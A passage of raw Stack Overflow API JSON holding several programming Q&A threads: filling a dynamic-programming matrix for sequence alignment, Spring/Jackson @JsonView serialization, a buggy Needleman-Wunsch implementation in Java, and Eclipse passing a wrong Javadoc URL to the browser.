rel=\"nofollow\">https://www.topcoder.com/tc?d1=tutorials&amp;d2=dynProg&amp;module=Static</a><br></p>\n"}],"owner":{"account_id":3019624,"reputation":195,"user_id":2560965,"accept_rate":75,"display_name":"judge"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1146,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642490182,"creation_date":1387283485,"question_id":20634226,"body_markdown":"hello guys i have 2d char array opt[][] and i have 2 sequence in my arrays like in example\r\n\r\nmy\r\n     \r\n     `opt[0][0]=A        \r\n      opt[0][1]=T\r\n      opt[0][2]=G\r\n      opt[0][3]=A`   \r\n\r\nand\r\n\r\n     opt[1][0]=A\r\n     opt[2][0]=G\r\n     opt[3][0]=C\r\n     opt[4][0]=T\r\n\r\n\r\n\r\n\r\n     \r\ni have this output currently\r\n\r\n\r\n       x/y|  A  T  G  A  -\r\n    _______________________\r\n      0 A |  0  0  0  0\r\n      1 G |  0  0  0  0\r\n      2 C |  0  0  0  0\r\n      3 T |  0  0  0  0\r\n      4 - |  0  0  0  0\r\n\r\nmy problem is this how can i use dynamic programming \r\n\r\nto create this array into this \r\n\r\nhttps://i.stack.imgur.com/ViHc9.png\r\n\r\n\r\nif its a match 0 penalty\r\nif its a mismatch 1 penalty\r\nif its a gap its 2 penalty\r\n\r\ni can compare chars of my array like this\r\n\r\n    for(int i=0;i&lt;4;i++){\r\n\r\n\t\t\t\t\tif(opt[0][i]==opt[i+1][0]){\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\tresult[0][i] =1;\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\r\nbut this is just a simple test i made to see if i can compare and it turned out i can.\r\n\r\nhow can i go from here to there(to the picture array","title":"dynamic programming filling matrix in sequence alignment","body":"<p>hello guys i have 2d char array opt[][] and i have 2 sequence in my arrays like in example</p>\n\n<p>my</p>\n\n<pre><code> `opt[0][0]=A        \n  opt[0][1]=T\n  opt[0][2]=G\n  opt[0][3]=A`   \n</code></pre>\n\n<p>and</p>\n\n<pre><code> opt[1][0]=A\n opt[2][0]=G\n opt[3][0]=C\n opt[4][0]=T\n</code></pre>\n\n<p>i have this output currently</p>\n\n<pre><code>   x/y|  A  T  G  A  -\n_______________________\n  0 A |  0  0  0  0\n  1 G |  0  0  0  0\n  2 C |  0  0  0  0\n  3 T |  0  0  0  0\n  4 - |  0  0  0  0\n</code></pre>\n\n<p>my problem is this how can i use dynamic programming </p>\n\n<p>to create this array into this </p>\n\n<p><a href=\"https://i.stack.imgur.com/ViHc9.png\" rel=\"nofollow\">https://i.stack.imgur.com/ViHc9.png</a></p>\n\n<p>if its a match 0 penalty\nif its a mismatch 1 penalty\nif its a gap its 2 penalty</p>\n\n<p>i can compare chars of my array like this</p>\n\n<pre><code>for(int i=0;i&lt;4;i++){\n\n                if(opt[0][i]==opt[i+1][0]){\n\n                    result[0][i] =1;\n\n                }\n</code></pre>\n\n<p>but this is just a simple test i made to see if i can compare and it turned out i can.</p>\n\n<p>how can i go from here to there(to the picture array</p>\n"},{"tags":["java","spring","spring-mvc","spring-boot","jackson"],"comments":[{"owner":{"account_id":277416,"reputation":681848,"user_id":571407,"accept_rate":100,"display_name":"JB Nizet"},"score":0,"creation_date":1482535180,"post_id":41308838,"comment_id":69820867,"body_markdown":"You can use views (https://spring.io/blog/2014/12/02/latest-jackson-integration-improvements-in-spring), or DTOs.","body":"You can use views (<a href=\"https://spring.io/blog/2014/12/02/latest-jackson-integration-improvements-in-spring\" rel=\"nofollow noreferrer\">spring.io/blog/2014/12/02/&hellip;</a>), or DTOs."},{"owner":{"account_id":9273909,"reputation":3750,"user_id":6887084,"display_name":"ScanQR"},"score":0,"creation_date":1482572828,"post_id":41308838,"comment_id":69827486,"body_markdown":"There has to be a clear separation of concerns. Same entity is used in multiple usecases and only relevant data should be exposed. Hence it is always best practice to use DTOs.","body":"There has to be a clear separation of concerns. Same entity is used in multiple usecases and only relevant data should be exposed. Hence it is always best practice to use DTOs."}],"answers":[{"tags":[],"owner":{"account_id":1108135,"reputation":1968,"user_id":1099093,"accept_rate":75,"display_name":"Sterling Duchess"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1482691758,"creation_date":1482691758,"answer_id":41323691,"question_id":41308838,"body_markdown":"For anyone else who is moving from Laravel(PHP), Django(Python), Rails(Ruby):  \r\n\r\nI created a package `serializers` in which I have a serializer class for each of my models.  \r\n\r\n    public class UserSerializer {\r\n    \r\n      // Default user values\r\n      public interface User {}\r\n    \r\n      // User values with users posts\r\n      public interface UserWithPosts extends User {}  \r\n    \r\n    }\r\n\r\nNow in your model what you do is annotate fields to which serializers they belong to:  \r\n\r\n    @Entity  \r\n    class User {\r\n    \r\n      @Id\r\n      @GeneratedValue\r\n      @JsonView(UserSerializer.User.class)\r\n      private Long id;\r\n    \r\n      @JsonView(UserSerializer.User.class)\r\n      private String username;\r\n    \r\n      @JsonView(UserSerializer.User.class)\r\n      private String email;\r\n    \r\n      @OneToMany(mappedBy = &quot;user&quot;)\r\n      @JsonManagedReference  // This prevents infinite loop  \r\n      @JsonView(UserSerializer.UserWithPosts.class)  \r\n      private List&lt;Post&gt; posts;\r\n    \r\n      // .. getters and setters bellow\r\n    }\r\n\r\nIn your controller you than annotate your methods with `@JsonView(..)` as to which serializer you want to use.  \r\n\r\n    @RestController  \r\n    @RequestMapping(&quot;users&quot;)  \r\n    public class UsersController {\r\n    \r\n      private UserRepository userRepository;\r\n    \r\n      public UserController(UserRepository userRepository) {\r\n        this.userRepository = userRepository;\r\n      }  \r\n    \r\n      /**\r\n       * In list method we only want users default values to keep the payload smaller.\r\n       */\r\n      @GetMapping(&quot;list&quot;)\r\n      @JsonView(UserSerializer.User.class)  \r\n      public @ResponseBody ArrayList&lt;User&gt; list() {\r\n        ArrayList&lt;User&gt; users = new ArrayList&lt;&gt;();\r\n        \r\n        for (User user : userRepository.findAll()) {\r\n          users.add(user);\r\n        }\r\n    \r\n        return users;\r\n      }\r\n    \r\n    \r\n      /**\r\n       * In this method we are only fetching a single user so payload is smaller so we can add the users posts as well. You could also toggle this with a url filter/parameter.  \r\n       */\r\n      @GetMapping(&quot;show&quot;)\r\n      @JsonView(UserSerializer.UserWithPosts.class)  \r\n      public @ResponseBody ArrayList&lt;User&gt; show(@RequestParam(name = &quot;id&quot;, required = true) Long id) {\r\n        return userRepository.findOne(id):\r\n      }\r\n    \r\n    }  \r\n\r\n\r\n**Configuration!** This was pretty easy to understand however when I first did it none of the examples/tutorials told/showed that you need to update the configuration as well. If you don&#39;t do it than you will have a problem with serializing your relations the serializers will still work however you would get something like this in your JSON response:  \r\n\r\n    ...\r\n    &quot;posts&quot;: [\r\n      {},\r\n      {},\r\n      {},..\r\n    ]\r\n    ...\r\n\r\nSo it would return a JSON object for each post user has but no values to fix this i created `config` package added a `WebConfiguration` class:  \r\n\r\n    @Configuration\r\n    @EnableWebMvc\r\n    public class WebConfiguration extends WebMvcConfigurerAdapter {\r\n    \r\n        @Override\r\n        public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters) {\r\n            ObjectMapper mapper = Jackson2ObjectMapperBuilder.json().defaultViewInclusion(true).build();\r\n            converters.add(new MappingJackson2HttpMessageConverter(mapper));\r\n        }\r\n    \r\n    }  \r\n\r\nYou can also do this in XML configuration. But I personally prefer using Java class based configuration. It would be great if spring documentation included better explanations for newcomers.","title":"Serialize model without relation","body":"<p>For anyone else who is moving from Laravel(PHP), Django(Python), Rails(Ruby):  </p>\n\n<p>I created a package <code>serializers</code> in which I have a serializer class for each of my models.  </p>\n\n<pre><code>public class UserSerializer {\n\n  // Default user values\n  public interface User {}\n\n  // User values with users posts\n  public interface UserWithPosts extends User {}  \n\n}\n</code></pre>\n\n<p>Now in your model what you do is annotate fields to which serializers they belong to:  </p>\n\n<pre><code>@Entity  \nclass User {\n\n  @Id\n  @GeneratedValue\n  @JsonView(UserSerializer.User.class)\n  private Long id;\n\n  @JsonView(UserSerializer.User.class)\n  private String username;\n\n  @JsonView(UserSerializer.User.class)\n  private String email;\n\n  @OneToMany(mappedBy = \"user\")\n  @JsonManagedReference  // This prevents infinite loop  \n  @JsonView(UserSerializer.UserWithPosts.class)  \n  private List&lt;Post&gt; posts;\n\n  // .. getters and setters bellow\n}\n</code></pre>\n\n<p>In your controller you than annotate your methods with <code>@JsonView(..)</code> as to which serializer you want to use.  </p>\n\n<pre><code>@RestController  \n@RequestMapping(\"users\")  \npublic class UsersController {\n\n  private UserRepository userRepository;\n\n  public UserController(UserRepository userRepository) {\n    this.userRepository = userRepository;\n  }  \n\n  /**\n   * In list method we only want users default values to keep the payload smaller.\n   */\n  @GetMapping(\"list\")\n  @JsonView(UserSerializer.User.class)  \n  public @ResponseBody ArrayList&lt;User&gt; list() {\n    ArrayList&lt;User&gt; users = new ArrayList&lt;&gt;();\n\n    for (User user : userRepository.findAll()) {\n      users.add(user);\n    }\n\n    return users;\n  }\n\n\n  /**\n   * In this method we are only fetching a single user so payload is smaller so we can add the users posts as well. You could also toggle this with a url filter/parameter.  \n   */\n  @GetMapping(\"show\")\n  @JsonView(UserSerializer.UserWithPosts.class)  \n  public @ResponseBody ArrayList&lt;User&gt; show(@RequestParam(name = \"id\", required = true) Long id) {\n    return userRepository.findOne(id):\n  }\n\n}  \n</code></pre>\n\n<p><strong>Configuration!</strong> This was pretty easy to understand however when I first did it none of the examples/tutorials told/showed that you need to update the configuration as well. If you don't do it than you will have a problem with serializing your relations the serializers will still work however you would get something like this in your JSON response:  </p>\n\n<pre><code>...\n\"posts\": [\n  {},\n  {},\n  {},..\n]\n...\n</code></pre>\n\n<p>So it would return a JSON object for each post user has but no values to fix this i created <code>config</code> package added a <code>WebConfiguration</code> class:  </p>\n\n<pre><code>@Configuration\n@EnableWebMvc\npublic class WebConfiguration extends WebMvcConfigurerAdapter {\n\n    @Override\n    public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters) {\n        ObjectMapper mapper = Jackson2ObjectMapperBuilder.json().defaultViewInclusion(true).build();\n        converters.add(new MappingJackson2HttpMessageConverter(mapper));\n    }\n\n}  \n</code></pre>\n\n<p>You can also do this in XML configuration. But I personally prefer using Java class based configuration. It would be great if spring documentation included better explanations for newcomers.</p>\n"},{"tags":[],"owner":{"account_id":2280473,"reputation":38656,"user_id":2005680,"accept_rate":67,"display_name":"Yevgeniy Afanasyev"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642490051,"creation_date":1642490051,"answer_id":70751566,"question_id":41308838,"body_markdown":"take a model without relation like that\r\n\r\n     $this-&gt;user = $user-&gt;withoutRelations();","title":"Serialize model without relation","body":"<p>take a model without relation like that</p>\n<pre><code> $this-&gt;user = $user-&gt;withoutRelations();\n</code></pre>\n"}],"owner":{"account_id":1108135,"reputation":1968,"user_id":1099093,"accept_rate":75,"display_name":"Sterling Duchess"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":310,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":41323691,"answer_count":2,"score":1,"last_activity_date":1642490051,"creation_date":1482534912,"question_id":41308838,"body_markdown":"I have two models:  \r\n\r\n    @Entity\r\n    class ModelA {\r\n      ...\r\n      @OneToMany(mappedBy = &quot;modelA&quot;)\r\n      @JsonManagedReference\r\n      private List&lt;ModelB&gt; modelBs = new ArrayList&lt;ModelB&gt;();\r\n      ...\r\n    }\r\n    \r\n    @Entity\r\n    class ModelB {\r\n      ...\r\n      @ManyToOne\r\n      @JoinColumn(name = &quot;modela_id&quot;)\r\n      @JsonBackReference\r\n      private ModelA modela;\r\n      ...\r\n    }\r\n\r\nAnd a REST/Resource controller for ModelA which has a list method:  \r\n\r\n    @GetMapping(&quot;list&quot;)\r\n    public @ResponseBody ArrayList&lt;ModelA&gt; list() {\r\n      ArrayList&lt;ModelA&gt; modelas = new ArrayList();\r\n      \r\n      for (ModelA moa : modelARepository.findAll()) {\r\n        modelas.add(moa);\r\n      }\r\n    \r\n      return modelas;\r\n    }\r\n\r\nNow by default the response from that controller will contain a JSON array of ModelA objects but those will also contain ModelB. Is there a way to pick which relations you want serialized and when ?  \r\n\r\nComing from Django/Laravel I would be solving this with dedicated serializes for instance I would have a `ModelAWithRelatiionsSerializer` where I would serializer ModelA + all of it&#39;s relations or `ModelAWithModelBSerializer` which would return ModelA serialized with one level of ModelB etc.  \r\n\r\nI know I can juse ignore annotation to not include it but that&#39;s really not the same and I saw nothing regarding serializes in Spring packages. What&#39;s the best or optimal way of doing this ?","title":"Serialize model without relation","body":"<p>I have two models:  </p>\n\n<pre><code>@Entity\nclass ModelA {\n  ...\n  @OneToMany(mappedBy = \"modelA\")\n  @JsonManagedReference\n  private List&lt;ModelB&gt; modelBs = new ArrayList&lt;ModelB&gt;();\n  ...\n}\n\n@Entity\nclass ModelB {\n  ...\n  @ManyToOne\n  @JoinColumn(name = \"modela_id\")\n  @JsonBackReference\n  private ModelA modela;\n  ...\n}\n</code></pre>\n\n<p>And a REST/Resource controller for ModelA which has a list method:  </p>\n\n<pre><code>@GetMapping(\"list\")\npublic @ResponseBody ArrayList&lt;ModelA&gt; list() {\n  ArrayList&lt;ModelA&gt; modelas = new ArrayList();\n\n  for (ModelA moa : modelARepository.findAll()) {\n    modelas.add(moa);\n  }\n\n  return modelas;\n}\n</code></pre>\n\n<p>Now by default the response from that controller will contain a JSON array of ModelA objects but those will also contain ModelB. Is there a way to pick which relations you want serialized and when ?  </p>\n\n<p>Coming from Django/Laravel I would be solving this with dedicated serializes for instance I would have a <code>ModelAWithRelatiionsSerializer</code> where I would serializer ModelA + all of it's relations or <code>ModelAWithModelBSerializer</code> which would return ModelA serialized with one level of ModelB etc.  </p>\n\n<p>I know I can juse ignore annotation to not include it but that's really not the same and I saw nothing regarding serializes in Spring packages. What's the best or optimal way of doing this ?</p>\n"},{"tags":["java","dynamic-programming","bioinformatics","biometrics"],"comments":[{"owner":{"account_id":366823,"reputation":77621,"user_id":712603,"accept_rate":92,"display_name":"David Robinson"},"score":0,"creation_date":1376959753,"post_id":18325274,"comment_id":26895435,"body_markdown":"What is in `getGlobalAlignment` (how do you know the bug isn&#39;t there?) And can you give an example of the input and output that is the wrong answer? Otherwise it will be almost impossible to find the bug.","body":"What is in <code>getGlobalAlignment</code> (how do you know the bug isn&#39;t there?) And can you give an example of the input and output that is the wrong answer? Otherwise it will be almost impossible to find the bug."},{"owner":{"account_id":366823,"reputation":77621,"user_id":712603,"accept_rate":92,"display_name":"David Robinson"},"score":0,"creation_date":1376966932,"post_id":18325274,"comment_id":26896949,"body_markdown":"Click edit and put it into your question.","body":"Click edit and put it into your question."},{"owner":{"account_id":1723601,"reputation":2998,"user_id":1578789,"accept_rate":53,"display_name":"Madusanka"},"score":0,"creation_date":1376966999,"post_id":18325274,"comment_id":26896967,"body_markdown":"I have added it into the code.","body":"I have added it into the code."},{"owner":{"account_id":366823,"reputation":77621,"user_id":712603,"accept_rate":92,"display_name":"David Robinson"},"score":0,"creation_date":1376967055,"post_id":18325274,"comment_id":26896977,"body_markdown":"And can you provide an example of an input that gives the wrong answer?","body":"And can you provide an example of an input that gives the wrong answer?"},{"owner":{"account_id":1723601,"reputation":2998,"user_id":1578789,"accept_rate":53,"display_name":"Madusanka"},"score":0,"creation_date":1376968648,"post_id":18325274,"comment_id":26897301,"body_markdown":"makeScoringMatrix(&quot;ATCA&quot;,&quot;AGCA&quot;);","body":"makeScoringMatrix(&quot;ATCA&quot;,&quot;AGCA&quot;);"},{"owner":{"account_id":1700328,"reputation":6338,"user_id":1560599,"accept_rate":100,"display_name":"seaotternerd"},"score":0,"creation_date":1377066041,"post_id":18325274,"comment_id":26938099,"body_markdown":"And what wrong answer does it give for ATCA, AGCA?","body":"And what wrong answer does it give for ATCA, AGCA?"},{"owner":{"account_id":751431,"reputation":1068,"user_id":751241,"accept_rate":81,"display_name":"Stylize"},"score":0,"creation_date":1377106499,"post_id":18325274,"comment_id":26962355,"body_markdown":"why do you want to write an alignment algorithm? (i.e. why doe the existing ones not fit your needs?)","body":"why do you want to write an alignment algorithm? (i.e. why doe the existing ones not fit your needs?)"}],"answers":[{"tags":[],"owner":{"account_id":3089665,"reputation":31308,"user_id":2616073,"display_name":"dkatzel"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1377112878,"creation_date":1377112878,"answer_id":18365888,"question_id":18325274,"body_markdown":"Your scoring matrix is incorrect. If you print the matrix you will see that it looks like this:\r\n\r\n        A  T  C  A\r\n    A [3, 0, 0, 1, 0]\r\n    G [3, 0, 0, 1, 0]\r\n    C [3, 0, 0, 1, 0]\r\n    A [3, 0, 0, 1, 0]\r\n      [3, 0, 0, 1, 0]\r\n\r\nThe problem is you are comparing v[i] to every w[j] when it should only be compared to at most 2 adjacent positions (i and i+1).\r\n\r\nYou will also notice that the last column is all 0s when it should be the first row and first column are considered to be the terminal value (which is why the matrix is length+1).\r\n\r\nfinally, I believe during the traceback for a global alignment, you should start at the final position in the matrix and walk backwards (hence the term trace-**back**.  When you walk forward over your alignment you compare the sequence similarity in the sequence, not the scores in the matrix which I don&#39;t think is correct. \r\n\r\n\r\nYou should look at the wikipedia article on Needleman-Wunsch http://en.wikipedia.org/wiki/Needleman-Wunsch_algorithm or read one of the algorithm books; Durbin et al&#39;s *Biological sequence analysis* is the classic (but very hard to understand) book that covers pairwise alignments.\r\n","title":"How to build the scoring matrix for global sequence alignment?","body":"<p>Your scoring matrix is incorrect. If you print the matrix you will see that it looks like this:</p>\n\n<pre><code>    A  T  C  A\nA [3, 0, 0, 1, 0]\nG [3, 0, 0, 1, 0]\nC [3, 0, 0, 1, 0]\nA [3, 0, 0, 1, 0]\n  [3, 0, 0, 1, 0]\n</code></pre>\n\n<p>The problem is you are comparing v[i] to every w[j] when it should only be compared to at most 2 adjacent positions (i and i+1).</p>\n\n<p>You will also notice that the last column is all 0s when it should be the first row and first column are considered to be the terminal value (which is why the matrix is length+1).</p>\n\n<p>finally, I believe during the traceback for a global alignment, you should start at the final position in the matrix and walk backwards (hence the term trace-<strong>back</strong>.  When you walk forward over your alignment you compare the sequence similarity in the sequence, not the scores in the matrix which I don't think is correct. </p>\n\n<p>You should look at the wikipedia article on Needleman-Wunsch <a href=\"http://en.wikipedia.org/wiki/Needleman-Wunsch_algorithm\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Needleman-Wunsch_algorithm</a> or read one of the algorithm books; Durbin et al's <em>Biological sequence analysis</em> is the classic (but very hard to understand) book that covers pairwise alignments.</p>\n"},{"tags":[],"owner":{"account_id":1857291,"reputation":1152,"user_id":1682599,"accept_rate":82,"display_name":"Dinithi De Silva"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1378039573,"creation_date":1378039573,"answer_id":18558563,"question_id":18325274,"body_markdown":"Try this code...\r\n\r\n    public void makeMatrix(String v,String w)\r\n\t{\r\n\t\tint[][] maxDist=new int[v.length()+1][w.length()+1];\r\n\t\tfor(int i=0;i&lt;=v.length();i++)\r\n\t\t{\r\n\t\t\tfor(int j=0;j&lt;=w.length();j++)\r\n\t\t\t{\r\n\t\t\t\tif(i==0)\r\n\t\t\t\t\tmaxDist[i][j]=-j;\r\n\t\t\t\telse if(j==0)\r\n\t\t\t\t\tmaxDist[i][j]=-i;\r\n\t\t\t\telse\r\n\t\t\t\t\tmaxDist[i][j]=0;\r\n\t\t\t}\r\n\t\t}\r\n\t\tfillMatrix(maxDist, v, w);\r\n\t}\r\n\r\n    public int weight(String v,String w,int i,int j)\r\n\t{\r\n\t\tif(v.charAt(i-1)==w.charAt(j-1))\r\n\t\t\treturn 1;\r\n\t\telse\r\n\t\t\treturn -1;\r\n\t}\r\n\t\r\n\tpublic void fillMatrix(int[][] ar,String v,String w)\r\n\t{\r\n\t\tfor(int i=1;i&lt;=v.length();i++)\r\n\t\t{\r\n\t\t\tfor(int j=1;j&lt;=w.length();j++)\r\n\t\t\t{\r\n\t\t\t\tint scoreDiagonal=ar[i-1][j-1]+weight(v, w, i, j);\r\n\t\t\t\tint scoreLeft=ar[i][j-1]-1;\r\n\t\t\t\tint scoreUp=ar[i-1][j]-1;\r\n\t\t\t\t\r\n\t\t\t\tar[i][j]=Math.max(scoreDiagonal, Math.max(scoreLeft, scoreUp));\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\nHope this is the code you are looking for...","title":"How to build the scoring matrix for global sequence alignment?","body":"<p>Try this code...</p>\n\n<pre><code>public void makeMatrix(String v,String w)\n{\n    int[][] maxDist=new int[v.length()+1][w.length()+1];\n    for(int i=0;i&lt;=v.length();i++)\n    {\n        for(int j=0;j&lt;=w.length();j++)\n        {\n            if(i==0)\n                maxDist[i][j]=-j;\n            else if(j==0)\n                maxDist[i][j]=-i;\n            else\n                maxDist[i][j]=0;\n        }\n    }\n    fillMatrix(maxDist, v, w);\n}\n\npublic int weight(String v,String w,int i,int j)\n{\n    if(v.charAt(i-1)==w.charAt(j-1))\n        return 1;\n    else\n        return -1;\n}\n\npublic void fillMatrix(int[][] ar,String v,String w)\n{\n    for(int i=1;i&lt;=v.length();i++)\n    {\n        for(int j=1;j&lt;=w.length();j++)\n        {\n            int scoreDiagonal=ar[i-1][j-1]+weight(v, w, i, j);\n            int scoreLeft=ar[i][j-1]-1;\n            int scoreUp=ar[i-1][j]-1;\n\n            ar[i][j]=Math.max(scoreDiagonal, Math.max(scoreLeft, scoreUp));\n        }\n    }\n}\n</code></pre>\n\n<p>Hope this is the code you are looking for...</p>\n"}],"owner":{"account_id":1723601,"reputation":2998,"user_id":1578789,"accept_rate":53,"display_name":"Madusanka"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2004,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":18558563,"answer_count":2,"score":0,"last_activity_date":1642489991,"creation_date":1376959673,"question_id":18325274,"body_markdown":"I have tried to get the global sequence alignment between two strings. But it gives me the wrong answer.\r\nMy way of generating the scoring matrix as below.\r\n\r\n    public void makeScoringMatrix(String v,String w)\r\n    {\r\n    \tint ar[][]=new int[v.length()+1][w.length()+1];\r\n    \tfor(int i=v.length()-1;i&gt;=0;i--)\r\n    \t{\r\n    \t\tfor(int j=w.length()-1;j&gt;=0;j--)\r\n    \t\t{\r\n    \t\t\tif(v.charAt(i)==w.charAt(j))\r\n    \t\t\t\tar[i][j]=ar[i+1][j+1]+1;\r\n    \t\t\telse if(v.charAt(i)!=w.charAt(j))\r\n    \t\t\t\tar[i][j]=ar[i+1][j+1]+0;\r\n    \t\t\telse\r\n    \t\t\t\tar[i][j]=Math.max(ar[i][j+1],Math.max(ar[i+1][j],ar[i+1][j+1]));\r\n    \t\t}\r\n    \t}\r\n    \t//printArray(ar);\r\n    \tgetGlobalAlignment(ar,v,w);\r\n    }\r\n\r\n    public void getGlobalAlignment(int ar[][],String v,String w)\r\n    {\r\n    \tint i=0,j=0,index=0;\r\n    \twhile(i&lt;v.length() &amp;&amp; j&lt;w.length())\r\n    \t{\r\n    \t\tif(v.charAt(i)==w.charAt(j))\r\n    \t\t{\r\n    \t\t\tSystem.out.print(v.charAt(i));\r\n    \t\t\ti++;\r\n    \t\t\tj++;\r\n    \t\t\tindex++;\r\n    \t\t\t\r\n    \t\t}\r\n    \t\telse if(ar[i+1][j]&gt;ar[i][j+1])\r\n    \t\t{\r\n    \t\t\ti++;\r\n    \t\t}\r\n    \t\telse\r\n    \t\t{\r\n    \t\t\tj++;\r\n    \t\t}\r\n    \t}\r\n    \t\r\n    }\r\n\r\n\r\nSomeone please help me...!","title":"How to build the scoring matrix for global sequence alignment?","body":"<p>I have tried to get the global sequence alignment between two strings. But it gives me the wrong answer.\nMy way of generating the scoring matrix as below.</p>\n\n<pre><code>public void makeScoringMatrix(String v,String w)\n{\n    int ar[][]=new int[v.length()+1][w.length()+1];\n    for(int i=v.length()-1;i&gt;=0;i--)\n    {\n        for(int j=w.length()-1;j&gt;=0;j--)\n        {\n            if(v.charAt(i)==w.charAt(j))\n                ar[i][j]=ar[i+1][j+1]+1;\n            else if(v.charAt(i)!=w.charAt(j))\n                ar[i][j]=ar[i+1][j+1]+0;\n            else\n                ar[i][j]=Math.max(ar[i][j+1],Math.max(ar[i+1][j],ar[i+1][j+1]));\n        }\n    }\n    //printArray(ar);\n    getGlobalAlignment(ar,v,w);\n}\n\npublic void getGlobalAlignment(int ar[][],String v,String w)\n{\n    int i=0,j=0,index=0;\n    while(i&lt;v.length() &amp;&amp; j&lt;w.length())\n    {\n        if(v.charAt(i)==w.charAt(j))\n        {\n            System.out.print(v.charAt(i));\n            i++;\n            j++;\n            index++;\n\n        }\n        else if(ar[i+1][j]&gt;ar[i][j+1])\n        {\n            i++;\n        }\n        else\n        {\n            j++;\n        }\n    }\n\n}\n</code></pre>\n\n<p>Someone please help me...!</p>\n"},{"tags":["java","eclipse","javadoc"],"comments":[{"owner":{"account_id":13796,"reputation":19353,"user_id":27905,"display_name":"nitind"},"score":0,"creation_date":1642439023,"post_id":70743186,"comment_id":125065705,"body_markdown":"Sounds similar to https://bugs.eclipse.org/574788, but that&#39;s supposed to be fixed. Maybe because it&#39;s a different part of the UI?","body":"Sounds similar to <a href=\"https://bugs.eclipse.org/574788\" rel=\"nofollow noreferrer\">bugs.eclipse.org/574788</a>, but that&#39;s supposed to be fixed. Maybe because it&#39;s a different part of the UI?"},{"owner":{"account_id":6765594,"reputation":669,"user_id":5210701,"accept_rate":67,"display_name":"m. vokhm"},"score":0,"creation_date":1642484146,"post_id":70743186,"comment_id":125075805,"body_markdown":"@nitind In my case, the Javadoc view displays the content correctly, just like the popup Javahelp window in the editor. The issue seems to relate only to the url being passed to the browser.","body":"@nitind In my case, the Javadoc view displays the content correctly, just like the popup Javahelp window in the editor. The issue seems to relate only to the url being passed to the browser."}],"owner":{"account_id":6765594,"reputation":669,"user_id":5210701,"accept_rate":67,"display_name":"m. vokhm"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":225,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642489846,"creation_date":1642430770,"question_id":70743186,"body_markdown":"In Eclipse 2021-12 (4.22.0), I have a maven project that uses `assertJ`, among others. When the mouse hovers over a method or a class from this library, Eclipse shows the appropriate Javadoc in the Javadoc pop-up and in the Javadoc view, as it should. But when I attempt to open the Javadoc in the browser, the browser shows an empty page, without any content. The `url` passed to the browser reads\r\n\r\n&gt; http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org.assertj.core/org/assertj/core/api/Assertions.html#assertThat(double)\r\n\r\nThe Javadoc jar-file presents at the above-mentioned location, and the `Javadoc location` for the library in the build path is correct: \r\n\r\n[![enter image description here][1]][1]\r\n\r\n(otherwise Eclipse could not show the pop-up Javadoc window), but the address passed to the browser is wrong, it includes the package name, **org.assertj.core/**, that seems to be redundant, it shouldn&#39;t be there. The url \r\n\r\n&gt; http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org/assertj/core/api/Assertions.html#assertThat(double)\r\n\r\nopens the right Javadoc page. Regarding other libraries whose Javadoc jars are located in the local maven repository, the behavior is the same -- their javadoc don&#39;t open in the browser, but if I manually remove the package name from the the browser&#39;s address string, the required pages open.\r\n\r\nWhat may be the reason? Who is responsible for building the wrong address string that&#39;s passed to the browser, and how can I fix it or what workaround can be used? \r\n\r\n\r\n  [1]: https://i.stack.imgur.com/Rcglm.png","title":"Eclipse doesn&#39;t open JavaDoc in the browser","body":"<p>In Eclipse 2021-12 (4.22.0), I have a maven project that uses <code>assertJ</code>, among others. When the mouse hovers over a method or a class from this library, Eclipse shows the appropriate Javadoc in the Javadoc pop-up and in the Javadoc view, as it should. But when I attempt to open the Javadoc in the browser, the browser shows an empty page, without any content. The <code>url</code> passed to the browser reads</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org.assertj.core/org/assertj/core/api/Assertions.html#assertThat(double)\" rel=\"nofollow noreferrer\">http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org.assertj.core/org/assertj/core/api/Assertions.html#assertThat(double)</a></p>\n</blockquote>\n<p>The Javadoc jar-file presents at the above-mentioned location, and the <code>Javadoc location</code> for the library in the build path is correct:</p>\n<p><a href=\"https://i.stack.imgur.com/Rcglm.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Rcglm.png\" alt=\"enter image description here\" /></a></p>\n<p>(otherwise Eclipse could not show the pop-up Javadoc window), but the address passed to the browser is wrong, it includes the package name, <strong>org.assertj.core/</strong>, that seems to be redundant, it shouldn't be there. The url</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org/assertj/core/api/Assertions.html#assertThat(double)\" rel=\"nofollow 